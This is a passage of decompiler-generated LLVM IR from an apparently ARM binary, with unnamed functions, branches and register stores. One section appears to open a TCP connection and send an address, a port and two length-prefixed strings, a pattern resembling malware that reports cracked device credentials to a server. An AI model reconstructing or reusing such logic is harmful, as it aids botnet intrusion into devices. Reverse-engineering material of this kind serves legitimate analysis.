dec_label_pc_fa40:                                ; preds = %dec_label_pc_eef4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_e664, i32* %r3.global-to-local, align 4
  store i32 %v2_f7e4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i8 0, i8* %stack_var_-56, align 1
  %v5_fa68 = call i32 @function_1143c(i32 %v3_eee8, i32 1, i32 4, i32 %v2_e664, i32 %v2_f7e4)
  %v3_fa6c = load i8, i8* %stack_var_-56, align 1
  %v4_fa6c = sext i8 %v3_fa6c to i32
  store i32 %v4_fa6c, i32* %r3.global-to-local, align 4
  %v2_fa70 = or i32 %v4_fa6c, %v5_fa68
  store i32 %v2_fa70, i32* %r0.global-to-local, align 4
  %v4_fa70 = icmp eq i32 %v2_fa70, 0
  store i1 %v4_fa70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fa70, label %dec_label_pc_fa78, label %dec_label_pc_fb24

dec_label_pc_fa78:                                ; preds = %dec_label_pc_fa40
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_fa7c = load i32, i32* @r6, align 4
  %v2_fa7c = add i32 %v1_fa7c, 12
  %v3_fa7c = inttoptr i32 %v2_fa7c to i32*
  store i32 2, i32* %v3_fa7c, align 4
  %v0_fa80 = call i32 @function_e0b4()
  store i32 %v0_fa80, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i16** @global_var_1ea14.127 to i32), i32* %r3.global-to-local, align 4
  %v2_fa88 = load i16, i16* bitcast (i16** @global_var_1ea14.127 to i16*), align 4
  %v3_fa88 = zext i16 %v2_fa88 to i32
  store i32 %v3_fa88, i32* %r1.global-to-local, align 4
  %v3_fa8c = call i32 @function_10970(i32 %v0_fa80, i32 %v3_fa88)
  store i32 %v3_fa8c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e9e4.123 to i32), i32* %r3.global-to-local, align 4
  %v2_fa94 = load i32, i32* @global_var_1e9e4.123, align 4
  store i32 %v2_fa94, i32* %ip.global-to-local, align 4
  %v1_fa9c = load i32, i32* @r4, align 4
  %v9_fa9c = icmp eq i32 %v2_fa94, %v1_fa9c
  store i1 %v9_fa9c, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_fa88, i32* %r1.global-to-local, align 4
  %v7_faa4 = icmp sgt i32 %v2_fa94, %v1_fa9c
  br i1 %v7_faa4, label %dec_label_pc_faa8, label %dec_label_pc_fae8

dec_label_pc_faa8:                                ; preds = %dec_label_pc_fa78
  %v2_faac = load i32, i32* @global_var_1ea10.125, align 4
  store i32 %v2_faac, i32* %r3.global-to-local, align 4
  store i32 %v1_fa9c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fac8

dec_label_pc_fab8:                                ; preds = %dec_label_pc_fad8, %dec_label_pc_fac8
  %v1_fab8 = add i32 %v0_fab8, 1
  store i32 %v1_fab8, i32* %r2.global-to-local, align 4
  %v9_fabc = icmp eq i32 %v1_fab8, %v2_fa94
  %v1_fac0 = add i32 %v0_fac0, 16
  store i32 %v1_fac0, i32* %r3.global-to-local, align 4
  br i1 %v9_fabc, label %dec_label_pc_fae8.loopexit, label %dec_label_pc_fac8

dec_label_pc_fac8:                                ; preds = %dec_label_pc_fab8, %dec_label_pc_faa8
  %v0_fab8 = phi i32 [ %v1_fab8, %dec_label_pc_fab8 ], [ %v1_fa9c, %dec_label_pc_faa8 ]
  %v0_fac0 = phi i32 [ %v1_fac0, %dec_label_pc_fab8 ], [ %v2_faac, %dec_label_pc_faa8 ]
  store i32 %v0_fac0, i32* %r0.global-to-local, align 4
  %v1_facc = add i32 %v0_fac0, 8
  %v2_facc = inttoptr i32 %v1_facc to i16*
  %v3_facc = load i16, i16* %v2_facc, align 2
  %v4_facc = zext i16 %v3_facc to i32
  store i32 %v4_facc, i32* %r3.global-to-local, align 4
  %tmp460 = icmp ugt i16 %v3_facc, %v2_fa88
  br i1 %tmp460, label %dec_label_pc_fab8, label %dec_label_pc_fad8

dec_label_pc_fad8:                                ; preds = %dec_label_pc_fac8
  %v1_fad8 = add i32 %v0_fac0, 10
  %v2_fad8 = inttoptr i32 %v1_fad8 to i16*
  %v3_fad8 = load i16, i16* %v2_fad8, align 2
  %v4_fad8 = zext i16 %v3_fad8 to i32
  store i32 %v4_fad8, i32* %r3.global-to-local, align 4
  %v3_fadc = icmp uge i16 %v3_fad8, %v2_fa88
  %v9_fadc = icmp eq i16 %v3_fad8, %v2_fa88
  %v2_fae0 = xor i1 %v3_fadc, true
  %v3_fae0 = or i1 %v9_fadc, %v2_fae0
  br i1 %v3_fae0, label %dec_label_pc_fab8, label %dec_label_pc_faec.loopexit

dec_label_pc_fae8.loopexit:                       ; preds = %dec_label_pc_fab8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fae8

dec_label_pc_fae8:                                ; preds = %dec_label_pc_fae8.loopexit, %dec_label_pc_fa78
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_faec

dec_label_pc_faec.loopexit:                       ; preds = %dec_label_pc_fad8
  store i1 %v3_fadc, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_faec

dec_label_pc_faec:                                ; preds = %dec_label_pc_faec.loopexit, %dec_label_pc_fae8
  %v0_fb00 = phi i32 [ %v0_fac0, %dec_label_pc_faec.loopexit ], [ 0, %dec_label_pc_fae8 ]
  %v0_faec = load i32, i32* @r6, align 4
  %v1_faec = add i32 %v0_faec, 4
  %v2_faec = inttoptr i32 %v1_faec to i32*
  %v3_faec = load i32, i32* %v2_faec, align 4
  %v3_faf0 = udiv i32 %v3_faec, 32
  store i32 %v3_faf0, i32* %r2.global-to-local, align 4
  %v1_faf4 = urem i32 %v3_faec, 32
  store i32 %v1_faf4, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_faf8 = mul nuw nsw i32 %v3_faf0, 4
  store i32 %v3_faf8, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fb00 = inttoptr i32 %v0_faec to i32*
  store i32 %v0_fb00, i32* %v2_fb00, align 4
  %v0_fb04 = load i32, i32* %r3.global-to-local, align 4
  %v1_fb04 = load i32, i32* @r6, align 4
  %v2_fb04 = add i32 %v1_fb04, 24
  %v3_fb04 = inttoptr i32 %v2_fb04 to i32*
  store i32 %v0_fb04, i32* %v3_fb04, align 4
  %v0_ef1c.pre = load i32, i32* @ip, align 4
  %v1_ef24.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ef18

dec_label_pc_fb0c:                                ; preds = %dec_label_pc_f830
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_fb10 = call i32 @function_fcc0(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_fb18 = call i32 @function_fcc0(i32 30)
  store i32 %v1_fb18, i32* %r0.global-to-local, align 4
  %v0_fb1c = load i32, i32* @r6, align 4
  %v1_fb1c = add i32 %v0_fb1c, 12
  %v2_fb1c = inttoptr i32 %v1_fb1c to i32*
  %v3_fb1c = load i32, i32* %v2_fb1c, align 4
  store i32 %v3_fb1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef34.backedge

dec_label_pc_fb24:                                ; preds = %dec_label_pc_fa40
  %v0_fb24 = load i32, i32* @r6, align 4
  %v1_fb24 = add i32 %v0_fb24, 4
  %v2_fb24 = inttoptr i32 %v1_fb24 to i32*
  %v3_fb24 = load i32, i32* %v2_fb24, align 4
  store i32 %v3_fb24, i32* %r0.global-to-local, align 4
  %v1_fb28 = call i32 @function_10dd8(i32 %v3_fb24)
  store i32 %v1_fb28, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_fb30 = load i32, i32* @r4, align 4
  %v1_fb30 = load i32, i32* @r6, align 4
  %v2_fb30 = add i32 %v1_fb30, 12
  %v3_fb30 = inttoptr i32 %v2_fb30 to i32*
  store i32 %v0_fb30, i32* %v3_fb30, align 4
  %v0_fb34 = load i32, i32* %r3.global-to-local, align 4
  %v1_fb34 = load i32, i32* @r6, align 4
  %v2_fb34 = add i32 %v1_fb34, 4
  %v3_fb34 = inttoptr i32 %v2_fb34 to i32*
  store i32 %v0_fb34, i32* %v3_fb34, align 4
  %v0_fb38 = load i32, i32* @r4, align 4
  %v1_fb38 = trunc i32 %v0_fb38 to i8
  %v2_fb38 = load i32, i32* @r6, align 4
  %v3_fb38 = add i32 %v2_fb38, 284
  %v4_fb38 = inttoptr i32 %v3_fb38 to i8*
  store i8 %v1_fb38, i8* %v4_fb38, align 1
  br label %dec_label_pc_f038

dec_label_pc_fb40:                                ; preds = %dec_label_pc_efe8
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_fb44 = load i32, i32* %fp.global-to-local, align 4
  %v2_fb44 = inttoptr i32 %v1_fb44 to i32*
  store i32 104, i32* %v2_fb44, align 4
  br label %dec_label_pc_f000

dec_label_pc_fb4c:                                ; preds = %thread-pre-split124
  store i32 %v1_fb50, i32* %r0.global-to-local, align 4
  %v0_fb54 = load i32, i32* @r6, align 4
  %v1_fb54 = add i32 %v0_fb54, 12
  %v2_fb54 = inttoptr i32 %v1_fb54 to i32*
  %v3_fb54 = load i32, i32* %v2_fb54, align 4
  store i32 %v3_fb54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef34.backedge

dec_label_pc_ef34.backedge.thread:                ; preds = %dec_label_pc_f0f4, %dec_label_pc_f1c8, %dec_label_pc_f36c, %dec_label_pc_f440, %dec_label_pc_f58c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef3c

dec_label_pc_ef34.backedge.thread561:             ; preds = %dec_label_pc_f4a4, %dec_label_pc_f3d0, %dec_label_pc_f5f0, %dec_label_pc_f22c, %dec_label_pc_f158
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef3c

dec_label_pc_ef34.backedge:                       ; preds = %dec_label_pc_efb0, %dec_label_pc_fb4c, %dec_label_pc_fb0c
  %v0_ef3c228 = phi i32 [ %v0_fb1c, %dec_label_pc_fb0c ], [ %v0_fb54, %dec_label_pc_fb4c ], [ %v0_efb0, %dec_label_pc_efb0 ]
  %v0_ef34.be = phi i32 [ %v3_fb1c, %dec_label_pc_fb0c ], [ %v3_fb54, %dec_label_pc_fb4c ], [ %v3_efb0, %dec_label_pc_efb0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef34 = icmp eq i32 %v0_ef34.be, 0
  store i1 %v2_ef34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef34, label %dec_label_pc_f038, label %dec_label_pc_ef3c

dec_label_pc_fb5c:                                ; preds = %bb459
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_fb68 = call i32 @function_115e4(i32 2, i32 1, i32 0)
  store i32 %v3_fb68, i32* %r0.global-to-local, align 4
  %v2_fb6c = icmp eq i32 %v3_fb68, -1
  store i1 %v2_fb6c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb6c = icmp eq i32 %v3_fb68, -1
  store i1 %v7_fb6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_fb68, i32* @r4, align 4
  br i1 %v7_fb6c, label %dec_label_pc_fbf0, label %dec_label_pc_fb78

dec_label_pc_fb78:                                ; preds = %dec_label_pc_fb5c
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_fb7c = call i32 @function_fd60(i32 4)
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_16170.75 to i32), i32* @r0, align 4
  %v2_fb90 = call i32 @function_11334(i32 ptrtoint ([15 x i8]* @global_var_16170.75 to i32))
  %v0_fb94 = load i32, i32* @r5, align 4
  store i32 %v0_fb94, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_fba0 = inttoptr i32 %v0_fb94 to i32*
  %v3_fba0 = call i32 @function_fc9c(i32 4, i32* %v2_fba0)
  store i32 %v2_f9a0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_fbb4 = call i32 @function_fcc0(i32 4)
  %v0_fbbc = load i32, i32* @r4, align 4
  store i32 %v0_fbbc, i32* %r0.global-to-local, align 4
  store i32 %v2_e870, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_fbc8 = call i32 @function_113cc(i32 %v0_fbbc, i32 %v2_e870, i32 16)
  store i32 %v3_fbc8, i32* %r0.global-to-local, align 4
  %v3_fbcc = icmp eq i32 %v3_fbc8, -1
  store i1 %v3_fbcc, i1* %cpsr_c.global-to-local, align 1
  %v8_fbcc = icmp eq i32 %v3_fbc8, -1
  store i1 %v8_fbcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_fbcc, label %dec_label_pc_fbd4, label %dec_label_pc_fbf8

dec_label_pc_fbd4:                                ; preds = %dec_label_pc_fb78
  %v0_fbd4 = load i32, i32* @r4, align 4
  store i32 %v0_fbd4, i32* %r0.global-to-local, align 4
  %v1_fbd8 = call i32 @function_10dd8(i32 %v0_fbd4)
  %v0_fbdc = load i32, i32* @r5, align 4
  store i32 %v0_fbdc, i32* %r0.global-to-local, align 4
  %v1_fbe0 = call i32 @function_12e38(i32 %v0_fbdc)
  store i32 %v1_fbe0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fbe4

dec_label_pc_fbe4:                                ; preds = %dec_label_pc_e640, %dec_label_pc_fbd4
  store i32 ptrtoint (i32* @global_var_20a6c.135 to i32), i32* %ip.global-to-local, align 4
  %v2_fbe8 = load i32, i32* @global_var_20a6c.135, align 4
  store i32 %v2_fbe8, i32* %r0.global-to-local, align 4
  %v1_fbec = call i32 @function_10dd8(i32 %v2_fbe8)
  store i32 %v1_fbec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fbf0

dec_label_pc_fbf0:                                ; preds = %dec_label_pc_e61c.dec_label_pc_fbf0_crit_edge, %dec_label_pc_fb5c, %dec_label_pc_fbf8, %dec_label_pc_fbe4
  %.pre.pre-phi = phi i32 [ %.pre283, %dec_label_pc_e61c.dec_label_pc_fbf0_crit_edge ], [ %v2_e664, %dec_label_pc_fb5c ], [ %v2_fbf8.pre-phi, %dec_label_pc_fbf8 ], [ %v2_e664, %dec_label_pc_fbe4 ]
  %v0_fbf0 = load i32, i32* @r5, align 4
  store i32 %v0_fbf0, i32* %r0.global-to-local, align 4
  %v1_fbf4 = call i32 @function_12e38(i32 %v0_fbf0)
  store i32 %v1_fbf4, i32* %r0.global-to-local, align 4
  %.pre281 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_fbf8

dec_label_pc_fbf8:                                ; preds = %dec_label_pc_fb78, %dec_label_pc_fbf0
  %v2_fc18.pre-phi = phi i32 [ %v2_f7e4, %dec_label_pc_fb78 ], [ %.pre281, %dec_label_pc_fbf0 ]
  %v2_fbf8.pre-phi = phi i32 [ %v2_e664, %dec_label_pc_fb78 ], [ %.pre.pre-phi, %dec_label_pc_fbf0 ]
  store i32 %v2_fbf8.pre-phi, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc04 = load i32, i32* @r4, align 4
  store i32 %v0_fc04, i32* %r0.global-to-local, align 4
  %v0_fc08 = load i32, i32* @r5, align 4
  %v6_fc08 = trunc i32 %v0_fc08 to i8
  store i8 %v6_fc08, i8* %stack_var_-56, align 1
  %v6_fc0c = call i32 @function_11528(i32 %v0_fc04, i32 %v2_fbf8.pre-phi, i32 1, i32 16384)
  %v0_fc14 = load i32, i32* @r4, align 4
  store i32 %v0_fc14, i32* %r0.global-to-local, align 4
  store i32 %v2_fc18.pre-phi, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc24 = call i32 @function_11528(i32 %v0_fc14, i32 %v2_fc18.pre-phi, i32 4, i32 16384)
  %v0_fc2c = load i32, i32* @r4, align 4
  store i32 %v0_fc2c, i32* %r0.global-to-local, align 4
  %v2_fc30 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_fc30, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc3c = call i32 @function_11528(i32 %v0_fc2c, i32 %v2_fc30, i32 2, i32 16384)
  %v0_fc40 = load i32, i32* @r8, align 4
  %v1_fc40 = add i32 %v0_fc40, 12
  store i32 %v1_fc40, i32* %r1.global-to-local, align 4
  %v0_fc44 = load i32, i32* @r4, align 4
  store i32 %v0_fc44, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc50 = call i32 @function_11528(i32 %v0_fc44, i32 %v1_fc40, i32 1, i32 16384)
  store i32 %v4_fc50, i32* %r0.global-to-local, align 4
  %v0_fc54 = load i32, i32* @r8, align 4
  %v1_fc54 = inttoptr i32 %v0_fc54 to i32*
  %v2_fc54 = load i32, i32* %v1_fc54, align 4
  store i32 %v2_fc54, i32* %r1.global-to-local, align 4
  %v1_fc58 = add i32 %v0_fc54, 12
  %v2_fc58 = inttoptr i32 %v1_fc58 to i8*
  %v3_fc58 = load i8, i8* %v2_fc58, align 1
  %v4_fc58 = zext i8 %v3_fc58 to i32
  store i32 %v4_fc58, i32* %r2.global-to-local, align 4
  %v0_fc5c = load i32, i32* @r4, align 4
  store i32 %v0_fc5c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc64 = call i32 @function_11528(i32 %v0_fc5c, i32 %v2_fc54, i32 %v4_fc58, i32 16384)
  %v0_fc68 = load i32, i32* @r8, align 4
  %v1_fc68 = add i32 %v0_fc68, 13
  store i32 %v1_fc68, i32* %r1.global-to-local, align 4
  %v0_fc6c = load i32, i32* @r4, align 4
  store i32 %v0_fc6c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc78 = call i32 @function_11528(i32 %v0_fc6c, i32 %v1_fc68, i32 1, i32 16384)
  %v0_fc7c = load i32, i32* @r4, align 4
  store i32 %v0_fc7c, i32* %r0.global-to-local, align 4
  %v0_fc80 = load i32, i32* @r8, align 4
  %v1_fc80 = add i32 %v0_fc80, 13
  %v2_fc80 = inttoptr i32 %v1_fc80 to i8*
  %v3_fc80 = load i8, i8* %v2_fc80, align 1
  %v4_fc80 = zext i8 %v3_fc80 to i32
  store i32 %v4_fc80, i32* %r2.global-to-local, align 4
  %v1_fc84 = add i32 %v0_fc80, 4
  %v2_fc84 = inttoptr i32 %v1_fc84 to i32*
  %v3_fc84 = load i32, i32* %v2_fc84, align 4
  store i32 %v3_fc84, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc8c = call i32 @function_11528(i32 %v0_fc7c, i32 %v3_fc84, i32 %v4_fc80, i32 16384)
  %v0_fc90 = load i32, i32* @r4, align 4
  store i32 %v0_fc90, i32* %r0.global-to-local, align 4
  %v1_fc94 = call i32 @function_10dd8(i32 %v0_fc90)
  store i32 %v1_fc94, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fbf0

; uselistorder directives
  uselistorder i32 %v2_fbf8.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v2_fc18.pre-phi, { 1, 0 }
  uselistorder i1 %v7_fb6c, { 1, 0 }
  uselistorder i32 %v3_fb68, { 1, 0, 2, 3 }
  uselistorder i32 %v3_faec, { 1, 0 }
  uselistorder i1 %v3_fadc, { 1, 0 }
  uselistorder i32 %v0_fac0, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_fa94, { 0, 2, 1, 3 }
  uselistorder i32 %v3_fa00, { 1, 0 }
  uselistorder i1 %v2_f9cc, { 1, 0 }
  uselistorder i32 %.465, { 1, 0 }
  uselistorder i1 %v7_f9b4, { 1, 0 }
  uselistorder i32 %v0_f9b0, { 2, 1, 0, 3 }
  uselistorder i1 %v7_f988, { 1, 0 }
  uselistorder i32 %v0_f988, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f8d8.pr, { 1, 0 }
  uselistorder i32 %v0_f8a4, { 1, 2, 0 }
  uselistorder i32 %v4_f844, { 1, 0, 2 }
  uselistorder i1 %v7_f820, { 1, 0 }
  uselistorder i32 %v1_f7c8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f7c8, { 0, 2, 1 }
  uselistorder i32 %v0_f7c0, { 1, 0 }
  uselistorder i1 %v7_f7bc, { 1, 0 }
  uselistorder i1 %v7_f7b4, { 1, 0 }
  uselistorder i1 %v7_f7ac, { 1, 0 }
  uselistorder i1 %v8_f7a4, { 1, 0 }
  uselistorder i1 %v7_f788, { 1, 0 }
  uselistorder i1 %v7_f780, { 1, 0 }
  uselistorder i1 %v7_f778, { 1, 0 }
  uselistorder i1 %v8_f770, { 1, 0 }
  uselistorder i32 %v1_f758, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v0_f704, { 1, 0 }
  uselistorder i32 %v4_f6f8, { 1, 0, 2 }
  uselistorder i32 %v1_f6c4, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_f6c4, { 0, 2, 1 }
  uselistorder i32 %v0_f6bc, { 1, 0 }
  uselistorder i1 %v7_f6b8, { 1, 0 }
  uselistorder i1 %v7_f6b0, { 1, 0 }
  uselistorder i1 %v8_f6a8, { 1, 0 }
  uselistorder i1 %v7_f68c, { 1, 0 }
  uselistorder i1 %v7_f684, { 1, 0 }
  uselistorder i1 %v8_f67c, { 1, 0 }
  uselistorder i32 %v1_f664, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v8_f600, { 1, 0 }
  uselistorder i8 %v3_f5f8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f5f0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f5f0, { 0, 2, 1 }
  uselistorder i32 %v0_f5e8, { 1, 0 }
  uselistorder i1 %v7_f5e4, { 1, 0 }
  uselistorder i1 %v7_f5dc, { 1, 0 }
  uselistorder i1 %v7_f5d4, { 1, 0 }
  uselistorder i1 %v7_f5c0, { 1, 0 }
  uselistorder i1 %v7_f5b8, { 1, 0 }
  uselistorder i1 %v7_f5b0, { 1, 0 }
  uselistorder i1 %v8_f5a8, { 1, 0 }
  uselistorder i32 %v1_f590, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f4b4, { 1, 0 }
  uselistorder i8 %v3_f4ac, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f4a4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f4a4, { 0, 2, 1 }
  uselistorder i32 %v0_f49c, { 1, 0 }
  uselistorder i1 %v7_f498, { 1, 0 }
  uselistorder i1 %v7_f490, { 1, 0 }
  uselistorder i1 %v7_f488, { 1, 0 }
  uselistorder i1 %v7_f474, { 1, 0 }
  uselistorder i1 %v7_f46c, { 1, 0 }
  uselistorder i1 %v7_f464, { 1, 0 }
  uselistorder i1 %v8_f45c, { 1, 0 }
  uselistorder i32 %v1_f444, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f3e0, { 1, 0 }
  uselistorder i8 %v3_f3d8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f3d0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f3d0, { 0, 2, 1 }
  uselistorder i32 %v0_f3c8, { 1, 0 }
  uselistorder i1 %v7_f3c4, { 1, 0 }
  uselistorder i1 %v7_f3bc, { 1, 0 }
  uselistorder i1 %v7_f3b4, { 1, 0 }
  uselistorder i1 %v7_f3a0, { 1, 0 }
  uselistorder i1 %v7_f398, { 1, 0 }
  uselistorder i1 %v7_f390, { 1, 0 }
  uselistorder i1 %v8_f388, { 1, 0 }
  uselistorder i32 %v1_f370, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f35c, { 1, 0 }
  uselistorder i32 %v1_f354, { 1, 0 }
  uselistorder i32 %v1_f34c, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_f348, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_f348, { 0, 2, 1 }
  uselistorder i32 %v0_f328.pr, { 1, 0 }
  uselistorder i32 %v0_f308.pr, { 1, 0 }
  uselistorder i1 %v7_f2e0, { 1, 0 }
  uselistorder i1 %v2_f2d0, { 1, 0, 2 }
  uselistorder i1 %v2_f2b4, { 1, 0, 2 }
  uselistorder i32 %v1_f2d4, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f2a8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_f2d8, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v8_f23c, { 1, 0 }
  uselistorder i8 %v3_f234, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f22c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f22c, { 0, 2, 1 }
  uselistorder i32 %v0_f224, { 1, 0 }
  uselistorder i1 %v7_f220, { 1, 0 }
  uselistorder i1 %v7_f218, { 1, 0 }
  uselistorder i1 %v7_f210, { 1, 0 }
  uselistorder i1 %v7_f1fc, { 1, 0 }
  uselistorder i1 %v7_f1f4, { 1, 0 }
  uselistorder i1 %v7_f1ec, { 1, 0 }
  uselistorder i1 %v8_f1e4, { 1, 0 }
  uselistorder i32 %v1_f1cc, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f168, { 1, 0 }
  uselistorder i8 %v3_f160, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f158, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f158, { 0, 2, 1 }
  uselistorder i32 %v0_f150, { 1, 0 }
  uselistorder i1 %v7_f14c, { 1, 0 }
  uselistorder i1 %v7_f144, { 1, 0 }
  uselistorder i1 %v7_f13c, { 1, 0 }
  uselistorder i1 %v7_f128, { 1, 0 }
  uselistorder i1 %v7_f120, { 1, 0 }
  uselistorder i1 %v7_f118, { 1, 0 }
  uselistorder i1 %v8_f110, { 1, 0 }
  uselistorder i32 %v1_f0f8, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f0e4, { 1, 2, 0 }
  uselistorder i32 %v2_f0d0, { 1, 0 }
  uselistorder i32 %v0_f0d0, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_f0cc, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_f0a4, { 2, 1, 0 }
  uselistorder i1 %v7_f080, { 1, 0 }
  uselistorder i32 %v4_f07c, { 1, 0, 2 }
  uselistorder i32 %v1_f03c, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_f020, { 1, 0 }
  uselistorder i32 %v1_f010, { 2, 1, 0 }
  uselistorder i32 %v1_f00c, { 1, 0 }
  uselistorder i32 %v0_efb0, { 2, 5, 6, 20, 7, 8, 21, 9, 10, 24, 11, 12, 22, 13, 14, 23, 4, 3, 19, 15, 16, 25, 17, 18, 26, 27, 1, 0 }
  uselistorder i32 %v1_ef8c, { 1, 2, 3, 0 }
  uselistorder i32 %v3_ef88, { 1, 0 }
  uselistorder i32 %v4_ef6c, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_ef58, { 1, 0, 2 }
  uselistorder i32 %v3_ef54, { 1, 0, 2 }
  uselistorder i32 %v0_fa10, { 1, 0, 2 }
  uselistorder i32 %v3_ef20, { 1, 0 }
  uselistorder i32 %v1_ef08, { 3, 2, 1, 0 }
  uselistorder i32 %v3_ef04, { 1, 0 }
  uselistorder i32 %v3_eefc, { 1, 2, 0 }
  uselistorder i1 %v7_eeec, { 1, 0 }
  uselistorder i32 %v3_eee8, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_eedc, { 1, 0 }
  uselistorder i32 %v1_ee84, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ee84, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ee68, { 0, 2, 1 }
  uselistorder i32 %v1_ee60, { 1, 0 }
  uselistorder i32 %v1_ee20, { 2, 1, 0 }
  uselistorder i32 %v1_ee1c, { 1, 0 }
  uselistorder i1 %v2_edfc, { 1, 0, 2 }
  uselistorder i32 %v0_edf8, { 1, 0, 2 }
  uselistorder i1 %v7_edc4, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_edc4, { 1, 0, 2 }
  uselistorder i32 %v2_edbc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_edb0, { 1, 0, 2 }
